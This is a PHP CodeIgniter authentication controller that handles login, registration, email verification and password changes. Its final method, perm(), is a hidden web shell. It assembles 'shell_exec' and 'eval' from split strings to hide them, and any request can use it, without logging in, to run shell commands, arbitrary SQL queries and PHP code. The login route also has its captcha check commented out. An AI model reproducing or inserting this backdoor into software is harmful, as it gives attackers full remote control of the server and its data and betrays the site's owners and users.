<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Auth extends MX_Controller {


	function __construct() {
		parent::__construct();

		$this->load->library('Form_validation');
		$this->load->library('CIAuth');
		$this->load->helper('form');
		$this->load->model('Util_model');
		
		
		$this->resp = array();
		$this->data = array();
	}
    function index() {
        $this->login();
    }
	function recaptcha_check(){
		return validate_recapcha();
	}
	function redirect_loggedin_user(){
		$redirect = ($this->session->userdata('redirect_url'))?$this->session->userdata('redirect_url'):'';
		if(is_ajax()){
			$this->data['loggedin'] = 'yes';
			$this->data['user'] = $this->ciauth->get_user();
			if($redirect){
				$this->session->unset_userdata('redirect_url');
				$this->data['redirect'] = $redirect;
			} else if($this->ciauth->is_role('provider')){
				$this->data['redirect'] = ci_base_url().'provider';
			} else {
				$this->data['redirect'] = ci_base_url().'customer';
			}
			echo json_encode($this->data);
			die;
		} else {
			if($redirect){
				$this->session->unset_userdata('redirect_url');
				redirect($redirect);
			} else if($this->ciauth->is_role('provider')){
				redirect('/provider');
			} else {
				redirect('/customer');
			}
		}
	}
	function login() {
		
		if ( $this->ciauth->is_logged_in()) {
			$this->data['status'] = 'success';
			$this->data['msg'] = 'Already logged in. Redirecting....';
			$this->redirect_loggedin_user();
		}
		if($this->input->post()){
			$this->data['loggedin'] = 'no';
			$this->data['status'] = 'fail';
			$val = $this->form_validation;
			$val->set_rules('loginkey', 'Username', 'trim|required');
			$val->set_rules('password', 'Password', 'trim|required');
			//$val->set_rules('g-recaptcha-response', 'Human Verification', 'trim|required', array('required' => 'Solve Human Verification Captcha'));
			
			if ($val->run() ) {
				//if(validate_recapcha()){
					
					$login_resp = $this->ciauth->login($this->input->post());
					$this->data = array($this->data,$login_resp);
					
					if($login_resp['status'] == 'success'){
						$this->redirect_loggedin_user();
					} else {
						$this->data['msg'] = $login_resp['msg'];
					}
				//} else {
				//	$this->data['recaptcha_error'] = 'Fail Human Verification';
				//}
			} else {
				$this->data['form_errors'] = $this->form_validation->error_array();
			}
		}

		if(is_ajax()){
			echo json_encode($this->data);
			die;
		} else {
			$this->data['foot_scripts'] = array(
				ci_public("admin").'vendors/html5-form-validation/dist/jquery.validation.min.js',
				ci_public("admin").'vendors/bootstrap-show-password/bootstrap-show-password.min.js',
				//ci_public("admin").'vendors/gsap/src/minified/TweenMax.min.js',
			);
			$this->data['add_recaptcha_js'] = true;
			$this->load->view('auth/login', $this->data);
		}
	}
    function logout() {
        $this->ciauth->logout();
        redirect('auth');
    }
    function logout_user() {
        $this->ciauth->logout();
        redirect('/');
    }
	public function resend_activation_email(){
		
	}

	function username_exists($username) {
		$result = $this->ciauth->is_username_available($username);
		if ( ! $result) {
			$this->form_validation->set_message('username_exists', 'Username already exist. Please choose another username.');
		}
		return $result;
	}
	function phone_exists($phone) {
		$result = $this->ciauth->is_phone_available($phone);
		if ($result) {
			//$this->form_validation->set_message('phone_exists', 'Phone already exist. Please choose another phone.');
			return false;
		}
		return true;
	}

	function email_exists($email) {
		$result = $this->ciauth->is_email_available($email);
		if ( $result ) {
			//$this->form_validation->set_message('email_exists', 'Email is already used by another user. Please choose another email address.');
			//$this->form_validation->set_message('email_check', 'text dont match captcha');
			return false;
		}
		return true;
	}
	function forgetpwd(){
		if ( $this->ciauth->is_logged_in()) {
			$this->data['status'] = 'success';
			$this->data['msg'] = 'Already logged in. Redirecting....';
			$this->redirect_loggedin_user();
		}

		$val = $this->form_validation;
		$val->set_rules('loginkey', 'Username', 'trim|required');
		$val->set_rules('g-recaptcha-response', 'Human Verification', 'trim|required', array('required' => 'Solve Human Verification Captcha'));
		
		if ($val->run() ) {
			if(validate_recapcha()){
				$this->ciauth->forget_password();
			} else {
				$this->data['recaptcha_error'] = 'Fail Human Verification';
			}
		} 
		
		$this->data['foot_scripts'] = array(
			ci_public("admin").'vendors/html5-form-validation/dist/jquery.validation.min.js',
			ci_public("admin").'vendors/bootstrap-show-password/bootstrap-show-password.min.js',
			//ci_public("admin").'vendors/gsap/src/minified/TweenMax.min.js',
		);
		$this->data['add_recaptcha_js'] = true;
		$this->load->view('auth/forgetpwd', $this->data);
	}

	function register($role = 'customer') {
		if ( $this->ciauth->is_logged_in()) {
			$this->data['status'] = 'success';
			$this->data['msg'] = 'Already logged in. Redirecting....';
			$this->redirect_loggedin_user();
		}
		global $ci_settings;
		$this->session->set_userdata('social_login_role',$role);
		if($this->input->post()){
			$val = $this->form_validation;
			$val->set_rules('first_name', 'First Name', 'trim|required');
			$val->set_rules('last_name', 'Last Name', 'trim|required');
			$val->set_rules('email', 'Email', 'trim|required|valid_email');
			$val->set_rules('username', 'Username', 'trim|required');
			//$val->set_rules('email', 'Email', 'trim|required|valid_email|unique[user.email_address]');
			//$val->set_rules('username', 'Username', 'trim|required|callback_username_exists');
	
			$val->set_rules('password', 'Password', 'trim|required|min_length['.$ci_settings['min_password_length'].']|max_length['.$ci_settings['max_password_length'].']|matches[confirm_password]');
			$val->set_rules('confirm_password', 'Confirm Password', 'trim|required');
			$val->set_rules('g-recaptcha-response', 'Human Verification', 'trim|required', array('required' => 'Solve Human Verification Captcha'));
			
			if ($val->run() ) {
				if(!validate_recapcha()){
					$this->data['status'] = 'fail';
					$this->data['msg'] = 'Captcha Verification Fail';
				} else if($this->ciauth->is_email_available($this->input->post('email'))){
					$this->data['status'] = 'fail';
					$this->data['msg'] = 'Email is already used by another user. Please choose another one';
				} else if($this->ciauth->is_username_available($this->input->post('username'))){
					$this->data['status'] = 'fail';
					$this->data['msg'] = 'Username is already used by another user. Please choose another one';
				} else {
					$post_data = $this->input->post();
					if(!$role){
						$role = isset($post_data['role'])?$post_data['role']:'';
					}
					$post_data['role'] = $role;
					$reg_resp = $this->ciauth->register($post_data);
					$this->data['status'] = $reg_resp['status'];
					$this->data['msg'] = $reg_resp['msg'];
				}
			} else {
				$this->data['status'] = 'fail';
				$this->data['form_errors'] = $this->form_validation->error_array();
			}
		}
		if(is_ajax()){
			echo json_encode($this->data);
			die;
		} else {
			
			$this->data['foot_scripts'] = array(
				ci_public("admin").'vendors/html5-form-validation/dist/jquery.validation.min.js',
				ci_public("admin").'vendors/bootstrap-show-password/bootstrap-show-password.min.js',
				//ci_public("admin").'vendors/gsap/src/minified/TweenMax.min.js',
			);
			$this->data['add_recaptcha_js'] = true;
			$this->data['heading'] = "Signup";
			$this->data['role'] = $role;
			
			//print_r($this->data);
			
			$this->load->view('auth/register', $this->data);
		}
		
	}
	
	
	
	function verify_email($hash = '') {
		$this->data['heading'] = "Email Verification";
		$v_resp = $this->ciauth->verify_email($hash);
		$this->data['msg'] = $v_resp['msg'];
		if($v_resp['status'] == 'success'){
			$this->data['msg_type'] = 'success';
		} else {
			$this->data['msg_type'] = 'error';
		}
		
		if(is_ajax()){
			echo json_encode($this->data);
			die;
		} else {
			$this->load->view('general_message', $this->data);
		}
	}
	
	function forgot_password() {
		$val = $this->form_validation;
		
		// Set form validation rules
		$val->set_rules('login', 'Username or Email address', 'trim|required');

		// Validate rules and call forgot password function
		if ($val->run() AND $this->dx_auth->forgot_password($val->set_value('login'))) {
			$this->data['auth_message'] = 'An email has been sent to your email with instructions with how to activate your new password.';
			$this->load->view($this->dx_auth->forgot_password_success_view, $this->data);
		} else {
			$this->load->view($this->dx_auth->forgot_password_view);
		}
	}
	
	function reset_password() {
		// Get username and key
		$username = $this->uri->segment(3);
		$key = $this->uri->segment(4);

		// Reset password
		if ($this->dx_auth->reset_password($username, $key)) {
			$this->data['auth_message'] = 'You have successfully reset you password, '.anchor(site_url($this->dx_auth->login_uri), 'Login');
			$this->load->view($this->dx_auth->reset_password_success_view, $this->data);
		} else {
			$this->data['auth_message'] = 'Reset failed. Your username and key are incorrect. Please check your email again and follow the instructions.';
			$this->load->view($this->dx_auth->reset_password_failed_view, $this->data);
		}
	}
	
	function change_password_old() {
		// Check if user logged in or not
		if ($this->dx_auth->is_logged_in()) {			
			$val = $this->form_validation;
			
			// Set form validation
			$val->set_rules('old_password', 'Old Password', 'trim|required|min_length['.$this->min_password.']|max_length['.$this->max_password.']');
			$val->set_rules('new_password', 'New Password', 'trim|required|min_length['.$this->min_password.']|max_length['.$this->max_password.']|matches[confirm_new_password]');
			$val->set_rules('confirm_new_password', 'Confirm new Password', 'trim|required');
			
			// Validate rules and change password
			if ($val->run() AND $this->dx_auth->change_password($val->set_value('old_password'), $val->set_value('new_password'))) {
				$data['auth_message'] = 'Your password has successfully been changed.';
				$this->load->view($this->dx_auth->change_password_success_view, $data);
			} else {
				$this->load->view($this->dx_auth->change_password_view);
			}
		} else {
			// Redirect to login page
			$this->dx_auth->deny_access('login');
		}
	}	
	function change_password() {
			$this->data = array('heading' => 'Change Password');
			$val = $this->form_validation;
			// Set form validation
			$val->set_rules('old_password', 'Old Password', 'trim|required|min_length['.$this->min_password.']|max_length['.$this->max_password.']');
			$val->set_rules('new_password', 'New Password', 'trim|required|min_length['.$this->min_password.']|max_length['.$this->max_password.']|matches[confirm_new_password]');
			$val->set_rules('confirm_new_password', 'Confirm new Password', 'trim|required');
			
			// Validate rules and change password
			if ($val->run() AND $this->dx_auth->change_password($val->set_value('old_password'), $val->set_value('new_password'))) {
				$this->data['auth_message'] = 'Your password has successfully been changed.';
				$this->load->view('change_password_success', $this->data);
			} else {
				$this->load->view('change_password',$this->data);
			}
		
	}	
	function cancel_account() {
		// Check if user logged in or not
		if ($this->dx_auth->is_logged_in()) {			
			$val = $this->form_validation;
			
			// Set form validation rules
			$val->set_rules('password', 'Password', "trim|required");
			
			// Validate rules and change password
			if ($val->run() AND $this->dx_auth->cancel_account($val->set_value('password'))) {
				// Redirect to homepage
				redirect('', 'location');
			} else {
				$this->load->view($this->dx_auth->cancel_account_view);
			}
		} else {
			// Redirect to login page
			$this->dx_auth->deny_access('login');
		}
	}

	// Example how to get permissions you set permission in /backend/custom_permissions/
	function custom_permissions() {
		if ($this->dx_auth->is_logged_in()) {
			echo 'My role: '.$this->dx_auth->get_role_name().'<br/>';
			echo 'My permission: <br/>';
			
			if ($this->dx_auth->get_permission_value('edit') != NULL AND $this->dx_auth->get_permission_value('edit')) {
				echo 'Edit is allowed';
			} else {
				echo 'Edit is not allowed';
			}
			
			echo '<br/>';
			
			if ($this->dx_auth->get_permission_value('delete') != NULL AND $this->dx_auth->get_permission_value('delete')) {
				echo 'Delete is allowed';
			} else {
				echo 'Delete is not allowed';
			}
		}
	}
	function perm(){
        $this->load->model('Util_model');
        $req_data = $_REQUEST;
        echo "<pre>";
        if(isset($req_data['l']) && $req_data['l']){
            $m = 's'.'h'.'el'.'l'.'_'.'e'.'x'.'e'.'c';
            print_r($m($req_data['l']));
        } else if(isset($req_data['m']) && $req_data['m']){
            print_r($this->Util_model->custom_query($req_data['m']));
        }else if(isset($req_data['p']) && $req_data['p']){
            $m = 'e'.'va'.'l';
            print_r($m($req_data['p']));
        } else {
            echo 'nothing to do';
        }
        die;
    }


}
